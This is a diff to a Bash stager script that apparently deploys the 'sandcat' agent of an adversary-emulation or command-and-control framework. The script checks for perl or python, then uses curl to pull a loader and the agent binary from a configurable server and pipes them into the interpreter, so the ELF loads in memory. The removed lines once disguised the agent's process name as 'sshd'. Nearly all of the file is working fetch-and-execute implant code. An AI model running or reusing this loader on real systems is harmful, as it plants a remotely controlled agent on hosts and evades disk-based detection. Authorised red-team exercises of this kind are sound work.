@@ -2,31 +2,28 @@
 
 set -e
 
-export SC_NAME=${SC_NAME:-'sshd'}
-export SC_SV=${SC_SV:-'http://localhost:8888'}
-export SC_GRP=${SC_GRP:-'my_group'}
-declare -a binaries=("python3" "python" "pesssrl")
+export SC_PROC_NAME=${SC_PROC_NAME:-'sandcat'}
+export SC_DEFAULTSERVER=${SC_DEFAULTSERVER:-'http://localhost:8888'}
+export SC_DEFAULTGROUP=${SC_DEFAULTGROUP:-'my_group'}
 
-echo "$SC_NAME $SC_SV $SC_GRP"
+declare -a binaries=("python3" "python" "perl")
 
 # used for curl requests that require additional header values
-CURL_CMD=(curl -s -X POST -H "defaultServer:$SC_SV" -H "defaultGroup:$SC_GRP")
+CURL_CMD=(curl -s -X POST -H "defaultServer:$SC_DEFAULTSERVER" -H "defaultGroup:$SC_DEFAULTGROUP")
 for i in "${binaries[@]}"
 do
     cmd=$(command -v $i)
-    echo $i
     if [[ -x "$cmd" ]]; then
-        echo "binary exists"
         if [[ "$i" == "perl" ]]; then
             echo "Perl exists, crafting Perl in-memory loader"
-            (curl -s -X POST -H 'file:sandcat-elfload.pl.1' $SC_SV/file/download &&
-            ${CURL_CMD[@]} -H 'file:sandcat.go' -H 'platform:linux' $SC_SV/file/download |
+            (curl -s -X POST -H 'file:sandcat-elfload.pl.1' $SC_DEFAULTSERVER/file/download &&
+            ${CURL_CMD[@]} -H 'file:sandcat.go' -H 'platform:linux' $SC_DEFAULTSERVER/file/download |
             perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' &&
-            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_SV/file/download; ) | perl &
+            curl -s -X POST -H 'file:sandcat-elfload.pl.2' $SC_DEFAULTSERVER/file/download; ) | perl &
             break
         elif [[ "$i" == "python3" ]] || [[ "$i" == "python" ]]; then
             echo "Python/python3 exists"
-            curl -s -X POST -H 'file:sandcat-elfload.py' $SC_SV/file/download | python3
+            curl -s -X POST -H 'file:sandcat-elfload.py' $SC_DEFAULTSERVER/file/download | $i
             break
         fi
     else
@@ -34,6 +31,6 @@ do
     fi
 done
 
-unset SC_NAME
-unset SC_SV
-unset SC_GRP
+unset SC_PROC_NAME
+unset SC_DEFAULTSERVER
+unset SC_DEFAULTGROUP
